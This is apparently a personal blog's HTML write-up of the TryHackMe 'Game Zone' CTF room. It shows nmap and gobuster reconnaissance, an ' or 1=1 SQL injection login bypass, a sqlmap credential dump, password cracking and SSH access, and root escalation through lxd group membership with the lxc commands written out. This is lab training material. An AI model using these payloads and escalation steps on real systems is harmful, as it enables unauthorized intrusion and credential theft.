@@ -1,0 +1,320 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>THM: Game Zone</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="Writeup for the GameZone ctf/walkthrough room in TryHackme." />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">THM: Game Zone</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org7eeb0c6">Introduction</a></li>
+<li><a href="#orga301af2">Reconnaissance</a>
+<ul>
+<li><a href="#orgfb5cc1b">Web Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#org1c10263">SQLi</a>
+<ul>
+<li><a href="#org004ec46">Game Zone Portal</a></li>
+<li><a href="#org1e480bb">SQLmap</a></li>
+</ul>
+</li>
+<li><a href="#org6850d58">Password Cracking</a></li>
+<li><a href="#org1770440">Initial Foothold</a></li>
+<li><a href="#org44940f6">Thoughts</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org7eeb0c6" class="outline-2">
+<h2 id="org7eeb0c6"><a href="#org7eeb0c6">Introduction</a></h2>
+<div class="outline-text-2" id="text-org7eeb0c6">
+<p>
+Take me to the <del>danger</del> game zone. Merry Christmas everyone, today is
+yet another full day and I&rsquo;ll be trying to take the most out of it. 
+</p>
+
+<p>
+Once again, I&rsquo;ve modified <code>/etc/hosts</code> and my local <code>bashrc</code> so that both
+<code>gamezone.thm</code> and <code>$IP</code> point to the target machine
+</p>
+</div>
+</div>
+
+<div id="outline-container-orga301af2" class="outline-2">
+<h2 id="orga301af2"><a href="#orga301af2">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-orga301af2">
+<p>
+Starting with my go-to snippet for CTFs:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org34e5254">nmap -sV -sC -oG nmap.initial $<span class="org-variable-name">IP</span>
+</pre>
+</div>
+
+<p>
+It shows 2 open ports:
+</p>
+<ul class="org-ul">
+<li class="off"><code>[&#xa0;]</code> 22/ssh</li>
+<li class="off"><code>[&#xa0;]</code> 80/http</li>
+</ul>
+
+<p>
+Since we have no credentials checking the ssh server out is not so
+promising, and due to that, I proceed to web enumeration, right after
+starting the full scan (hoping it may give us something extra).
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="org5fcd7eb">nmap -p- -oG nmap.full -T4 $<span class="org-variable-name">IP</span>
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgfb5cc1b" class="outline-3">
+<h3 id="orgfb5cc1b"><a href="#orgfb5cc1b">Web Enumeration</a></h3>
+<div class="outline-text-3" id="text-orgfb5cc1b">
+<p>
+Visiting the website (having already started Burp Proxy at the
+background, to record everything and limited the scope appropriately),
+we get a home page pointing to the Hitman games.
+</p>
+
+
+<div id="org2c1c01b" class="figure">
+<p><img src="images/Reconnaissance/20231227_084910_screenshot.png" alt="20231227_084910_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 1: </span>Hitman entry page</p>
+</div>
+
+<p>
+Like always, more information (supposing it does not exceed a certain
+limit where it becomes overwhelming), can&rsquo;t do any harm, so, I made
+sure to run <code>gobuster</code> as well:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="orgc63fc45">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+</pre>
+</div>
+
+<p>
+It did not reveal much, and <code>robots.txt</code> did not exist on the server, so
+there was not a lot to check. Taken straight from our output:
+</p>
+<ul class="org-ul">
+<li class="off"><code>[&#xa0;]</code> /.htpasswd (Status: 403)</li>
+<li class="off"><code>[&#xa0;]</code> /.htaccess (Status: 403)</li>
+<li class="off"><code>[&#xa0;]</code> /images (Status: 301)</li>
+<li class="off"><code>[&#xa0;]</code> /server-status (Status: 403)</li>
+</ul>
+
+<p>
+Since the room <b>points</b> to SQLi, this is our next step.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org1c10263" class="outline-2">
+<h2 id="org1c10263"><a href="#org1c10263">SQLi</a></h2>
+<div class="outline-text-2" id="text-org1c10263">
+<p>
+Now, we see that in each request there is a line in the following
+form:
+</p>
+<pre class="example" id="org25d804c">
+username=reqwer&amp;password=qwerqwer&amp;x=18&amp;y=7
+</pre>
+
+<p>
+Sending that to intruder to test our payloads hassle free. <del>Sadly, which I also realized when I manually tested this random combination you can see above, no error message is vis</del>
+</p>
+
+
+<div id="org478928a" class="figure">
+<p><img src="images/SQLi/20231227_090646_screenshot.png" alt="20231227_090646_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 2: </span>Subtle Error</p>
+</div>
+
+<p>
+No error is visibly caused by my sample injection payloads (just
+testing the usual as found in <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#summary">PayloadsAllTheThings</a>), when testing the
+username field, so moving on to password. Same behavior there, so it
+is possible that the selected payloads are just not good enough (?).
+</p>
+
+<p>
+Heading back to the room&rsquo;s page, however, it suggested that we leave
+the second field blank (should have thought of that by myself).
+</p>
+
+<p>
+Tinkering just a little bit there I got this that worked:
+</p>
+<pre class="example" id="org42df324">
+username=' or 1=1; ---&amp;password=&amp;x=0&amp;y=
+</pre>
+
+<p>
+Using that in our browser we get access to <i>Game Zone Portal</i>
+</p>
+</div>
+
+<div id="outline-container-org004ec46" class="outline-3">
+<h3 id="org004ec46"><a href="#org004ec46">Game Zone Portal</a></h3>
+<div class="outline-text-3" id="text-org004ec46">
+<p>
+Still taking advantage of Burp Suite Proxy, I&rsquo;m trying different
+payloads on the Portal&rsquo;s input field, to see what I can get:
+</p>
+<ul class="org-ul">
+<li>An error shows that the backend is MySQL, which I plan to take
+advantage of.</li>
+<li>After just a little manual enumeration, I decided to follow the
+room&rsquo;s advice<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>and move on with sqlmap.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org1e480bb" class="outline-3">
+<h3 id="org1e480bb"><a href="#org1e480bb">SQLmap</a></h3>
+<div class="outline-text-3" id="text-org1e480bb">
+<p>
+It worked smoothly, giving us both the posts that I had already found
+<b>and</b> a hash:username combination.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="org1797cd2">sqlmap -r request.txt --dbms mysql --dump
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org6850d58" class="outline-2">
+<h2 id="org6850d58"><a href="#org6850d58">Password Cracking</a></h2>
+<div class="outline-text-2" id="text-org6850d58">
+<p>
+Going to my john notes and just running john against gave me the
+password, I suspect just using the suggested command would be fine as well.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org1770440" class="outline-2">
+<h2 id="org1770440"><a href="#org1770440">Initial Foothold</a></h2>
+<div class="outline-text-2" id="text-org1770440">
+<p>
+Knowing the user:password combination we can safely login as <code>agent47</code>:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org409feda">ssh agent47@gamezone.thm
+</pre>
+</div>
+
+<p>
+After logging in I thought it might be beneficial to try my techniques
+for privilege escalation, however the basics turned out to be properly
+configured so no low-hanging fruit for me there.
+</p>
+
+<p>
+In any case, I wanted to avoid using <code>metasploit</code> and the suggested
+technique before attempting to do it myself, so I ran <code>linpeas</code> and
+while checking the output out, I noticed something I had seen in a CTF
+a long time ago, when I could not understand it so well: <code>(lxd)</code> group
+membership can usually be translated into root privileges.
+</p>
+
+<p>
+Heading to <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">HackTricks</a>, I carefully went for <code>method 2</code>, and babbity
+bibbity boop, I became root :P!
+</p>
+
+<p>
+Some snippets that I used can be found below, missing the parts where
+I used scp to copy the tar.gz files to the target machine, and the
+initialization that took place in my local machine. I did not deviate
+(at all) from the playbook&rsquo;s commands so it is easy for anyone to just
+follow the link and perform the same privesc.
+</p>
+<pre class="example" id="orgcefcf29">
+agent47@gamezone:~$ lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+Image imported with fingerprint: 78495f763d90135702f6430685b5cc0f14255034c8fccda355791263fdf49354
+agent47@gamezone:~$ lxd init
+error: You have existing containers or images. lxd init requires an empty LXD.
+agent47@gamezone:~$ lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+agent47@gamezone:~$ lxc init myimage mycontainer -c security.privileged=true
+Creating mycontainer
+error: Container 'mycontainer' already exists
+agent47@gamezone:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+agent47@gamezone:~$ lxc start mycontainer
+agent47@gamezone:~$ lxc exec mycontainer /bin/sh
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org44940f6" class="outline-2">
+<h2 id="org44940f6"><a href="#org44940f6">Thoughts</a></h2>
+<div class="outline-text-2" id="text-org44940f6">
+<p>
+This was the first time I performed port forwarding with ssh (even
+though it did not help me at all. I just did it to get the cms flags -
+searching the CMS&rsquo;s configuration files locally for some reason gave
+me a totally different version than the one online.), <b>BUT</b> I really
+liked playing around with it and enjoyed it.
+</p>
+
+<p>
+Now as far as the room is concerned, it had the perfect balance for
+me, not too difficult and with quite some stuff worth checking out. It
+has a <i>walkthrough</i> type of character, however, which I have come to
+dislike, and that is the main reason why I tried my best not to look
+at it, before getting something that <i>could</i> be a flag.
+</p>
+
+<p>
+Highly recommended!
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+Having used sqlmap a couple times before I was <b>amazed</b> to see
+the <code>-r</code> option. Well played on that one, definitely planning on reusing
+it later on.
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-12-27 Wed 08:11 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
